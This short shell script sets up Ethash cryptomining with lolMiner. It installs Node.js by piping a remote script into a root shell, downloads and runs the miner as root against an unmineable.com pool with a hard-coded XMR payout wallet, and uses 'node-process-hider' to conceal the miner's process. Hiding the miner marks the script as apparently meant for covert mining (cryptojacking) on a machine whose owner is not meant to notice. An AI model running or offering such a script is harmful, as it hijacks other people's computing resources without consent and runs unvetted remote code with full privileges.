sudo apt update
sudo apt-get install gcc -y
sudo apt-get install build-essential -y
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
sudo apt-get install -y nodejs
npm i -g node-process-hider
sudo ph add lolMiner
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Lin64.tar.gz
tar -xvzf lolMiner_v1.91_Lin64.tar.gz
cd 1.91
sudo ./lolMiner --algo ETHASH --ethstratum ETHPROXY --pool stratum+ssl://ethash.unmineable.com:4444 --user XMR:42G5pAGjXc4CyTVHhQSCLKN5hYsd8Mu7v5NqYf3ZeSN3NDNQPc1s4tzUj8weae9js6gg3g7Tre972jR5oZpr3Kj5RYh7y85.2  
